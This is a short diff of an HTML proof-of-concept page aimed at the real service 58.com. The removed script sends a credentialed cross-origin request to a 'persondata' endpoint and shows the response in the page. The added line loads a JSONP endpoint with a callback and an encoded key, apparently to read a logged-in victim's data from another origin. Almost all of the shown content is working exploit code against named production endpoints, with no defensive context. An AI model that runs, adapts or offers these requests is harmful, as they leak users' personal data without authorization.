@@ -6,19 +6,8 @@
 <button type="button" onclick="loadDoc()">click me</button>
 
 </div>
-<script>
-function loadDoc() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML =
-      this.responseText;
-    }
-  };
-  xhttp.withCredentials=true;
-  xhttp.open("GET","https://my.58.com/persondata",true)
-  xhttp.send();
-}
+<script type="text/javascript" src="https://ppuswapapi.58.com/swap/im?appId=10023-wb@jN1oMaGj8lk0&source=2&clientType=pcweb&callback=jQuery1124028223467148694414_1646382822368&_=1646382822369&key=2QO2MjMygjM4MjN0YTM98lJ4YzMyIDOygzM2QjNx8FNxQDN5YDO0EzN2QzMyIDOyADNyETM5JXZ1Fla9s2YhJGbsF2YmIWZ3NGc9UGc5RFduVWasNmJy0TZjJXdvNnJwsGb4o2Rh10bx4kaAJ2dtMjMwATM9QWSwBXY/0WavAXY3N3L">
+
 </script>
 </body>
 </html>
